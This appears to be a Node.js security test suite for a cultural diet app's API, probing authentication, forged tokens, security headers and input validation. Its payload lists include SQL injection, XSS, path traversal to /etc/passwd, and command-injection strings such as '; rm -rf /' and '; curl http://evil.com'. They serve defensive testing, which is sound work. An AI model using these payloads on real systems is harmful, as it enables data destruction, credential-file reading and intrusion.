// Security Testing Suite for Cultural Diet Application
const axios = require('axios');
const jwt = require('jsonwebtoken');

class SecurityTester {
  constructor(baseUrl = 'http://localhost:3001') {
    this.baseUrl = baseUrl;
    this.client = axios.create({
      baseURL: baseUrl,
      timeout: 10000,
      validateStatus: function (status) {
        return status < 500; // Don't throw for 4xx errors
      }
    });
  }

  // Test cases for authentication security
  async testAuthenticationSecurity() {
    console.log('\n🔐 Testing Authentication Security...');

    const results = {
      weakPasswords: { passed: true, issues: [] },
      bruteForce: { passed: true, issues: [] },
      tokenSecurity: { passed: true, issues: [] },
      unauthorizedAccess: { passed: true, issues: [] }
    };

    try {
      // Test weak password rejection
      const weakPasswords = ['123', 'password', 'qwerty', 'admin', 'root'];
      for (const password of weakPasswords) {
        const response = await this.client.post('/api/v1/auth/register', {
          email: 'test+weak@example.com',
          password: password,
          name: 'Test User',
          culturalBackground: 'hindu'
        });

        if (response.status >= 200 && response.status < 300) {
          results.weakPasswords.passed = false;
          results.weakPasswords.issues.push(`Password "${password}" should be rejected`);
        }
      }

      // Test token manipulation
      const legitimateToken = await this.getTestToken();
      const malformedTokens = [
        'invalid.token.here',
        'Bearer ' + legitimateToken + 'extra',
        legitimateToken.replace(/.$/, 'X'),
        jwt.sign({ userId: 'admin' }, 'wrong-secret')
      ];

      for (const token of malformedTokens) {
        const response = await this.client.get('/api/v1/users/profile', {
          headers: { 'Authorization': `Bearer ${token}` }
        });

        if (response.status === 200) {
          results.tokenSecurity.passed = false;
          results.tokenSecurity.issues.push(`Invalid token was accepted`);
        }
      }

      // Test unauthorized access
      const protectedEndpoints = [
        '/api/v1/users/profile',
        '/api/v1/meal-plans',
        '/api/v1/shopping-lists'
      ];

      for (const endpoint of protectedEndpoints) {
        const response = await this.client.get(endpoint);
        if (response.status === 200) {
          results.unauthorizedAccess.passed = false;
          results.unauthorizedAccess.issues.push(`${endpoint} accessible without auth`);
        }
      }

    } catch (error) {
      console.log('Security test error:', error.message);
    }

    return results;
  }

  // Test for input validation and injection attacks
  async testInputValidation() {
    console.log('\n🛡️ Testing Input Validation Security...');

    const results = {
      sqlInjection: { passed: true, issues: [] },
      xssAttacks: { passed: true, issues: [] },
      commandInjection: { passed: true, issues: [] },
      directoryTraversal: { passed: true, issues: [] }
    };

    const maliciousInputs = {
      sqlInjection: [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'' UNION SELECT * FROM users --",
        "'; INSERT INTO users VALUES('hacker','password'); --"
      ],
      xssAttacks: [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src=x onerror=alert("xss")>',
        '"><script>alert("xss")</script>',
        '{{constructor.constructor("return this")().alert("xss")}}'
      ],
      commandInjection: [
        '; rm -rf /',
        '`cat /etc/passwd`',
        '$(id)',
        '|whoami',
        '; curl http://evil.com'
      ],
      directoryTraversal: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....//....//....//etc/passwd'
      ]
    };

    try {
      for (const [category, payloads] of Object.entries(maliciousInputs)) {
        for (const payload of payloads) {
          const response = await this.client.post('/api/v1/auth/register', {
            email: `test${Math.random()}@example.com`,
            password: 'SecurePass123!',
            name: payload,
            culturalBackground: 'hindu'
          });

          if (response.status >= 200 && response.status < 300) {
            results[category].passed = false;
            results[category].issues.push(`Malicious input accepted: ${payload}`);
          }
        }
      }
    } catch (error) {
      console.log('Input validation test error:', error.message);
    }

    return results;
  }

  // Test cultural data integrity
  async testCulturalDataIntegrity() {
    console.log('\n🕉️ Testing Cultural Data Integrity Security...');

    const results = {
      forbiddenFoodCircumvention: { passed: true, issues: [] },
      culturalRuleManipulation: { passed: true, issues: [] },
      doshaSystemIntegrity: { passed: true, issues: [] },
      retailDataSecurity: { passed: true, issues: [] }
    };

    try {
      const token = await this.getTestToken();

      // Test attempts to circumvent forbidden food rules
      const forbiddenFoods = ['beef', 'pork', 'lamb'];
      for (const food of forbiddenFoods) {
        const response = await this.client.post('/api/v1/cultural-rules/validate-ingredient', {
          ingredient: food,
          culturalBackground: 'hindu'
        }, {
          headers: { 'Authorization': `Bearer ${token}` }
        });

        if (response.data.isAllowed === true) {
          results.forbiddenFoodCircumvention.passed = false;
          results.forbiddenFoodCircumvention.issues.push(`Forbidden food ${food} was allowed`);
        }
      }

      // Test cultural rule manipulation through API
      const maliciousRuleData = {
        name: 'False Rule',
        type: 'religious',
        forbidden_ingredients: ['chicken'], // Try to make chicken forbidden
        culturalBackground: 'hindu'
      };

      const response = await this.client.post('/api/v1/cultural-rules', maliciousRuleData, {
        headers: { 'Authorization': `Bearer ${token}` }
      });

      if (response.status >= 200 && response.status < 300) {
        results.culturalRuleManipulation.passed = false;
        results.culturalRuleManipulation.issues.push('Unauthorized rule creation allowed');
      }

    } catch (error) {
      console.log('Cultural data integrity test error:', error.message);
    }

    return results;
  }

  // Test overall system security headers
  async testSecurityHeaders() {
    console.log('\n🔒 Testing Security Headers...');

    const results = {
      securityHeaders: { passed: true, issues: [] },
      corsPolicy: { passed: true, issues: [] },
      contentSecurityPolicy: { passed: true, issues: [] }
    };

    try {
      const response = await this.client.get('/health');
      const headers = response.headers;

      // Check for essential security headers
      const requiredHeaders = [
        'x-content-type-options',
        'x-frame-options',
        'x-xss-protection'
      ];

      for (const header of requiredHeaders) {
        if (!headers[header]) {
          results.securityHeaders.passed = false;
          results.securityHeaders.issues.push(`Missing security header: ${header}`);
        }
      }

      // Check CORS configuration
      if (headers['access-control-allow-origin'] === '*') {
        results.corsPolicy.passed = false;
        results.corsPolicy.issues.push('CORS allows all origins');
      }

    } catch (error) {
      console.log('Security headers test error:', error.message);
    }

    return results;
  }

  // Helper function to get test token
  async getTestToken() {
    try {
      const response = await this.client.post('/api/v1/auth/register', {
        email: `test${Date.now()}@culturaldiet.com`,
        password: 'SecurePass123!',
        name: 'Security Test User',
        culturalBackground: 'hindu'
      });

      return response.data.token;
    } catch (error) {
      // If registration fails, try login
      const response = await this.client.post('/api/v1/auth/login', {
        email: 'test@culturaldiet.com',
        password: 'SecurePass123!'
      });
      return response.data.token;
    }
  }

  // Run all security tests
  async runAllTests() {
    console.log('🚀 Starting Security Testing for Cultural Diet Application...\n');

    const authTests = await this.testAuthenticationSecurity();
    const inputTests = await this.testInputValidation();
    const culturalTests = await this.testCulturalDataIntegrity();
    const headerTests = await this.testSecurityHeaders();

    const allTests = {
      authentication: authTests,
      inputValidation: inputTests,
      culturalIntegrity: culturalTests,
      securityHeaders: headerTests
    };

    console.log('\n📊 Security Test Results Summary:');
    console.log('===================================');

    let totalTests = 0;
    let passedTests = 0;

    Object.entries(allTests).forEach(([category, tests]) => {
      console.log(`\n${category.toUpperCase()}:`);

      Object.entries(tests).forEach(([testName, result]) => {
        totalTests++;
        if (result.passed) {
          passedTests++;
          console.log(`  ✅ ${testName}: PASSED`);
        } else {
          console.log(`  ❌ ${testName}: FAILED`);
          (result.issues || []).forEach(issue => {
            console.log(`    - ${issue}`);
          });
        }
      });
    });

    const passRate = ((passedTests / totalTests) * 100).toFixed(1);
    console.log(`\n🎯 Overall Security Score: ${passRate}% (${passedTests}/${totalTests} tests passed)`);

    if (passedTests === totalTests) {
      console.log('🎉 All security tests PASSED! Application is secure.');
    } else {
      console.log('⚠️  Security issues detected. Please review and fix.');
    }

    return allTests;
  }
}

// Main execution
if (require.main === module) {
  const tester = new SecurityTester();
  tester.runAllTests().catch(console.error);
}

module.exports = SecurityTester;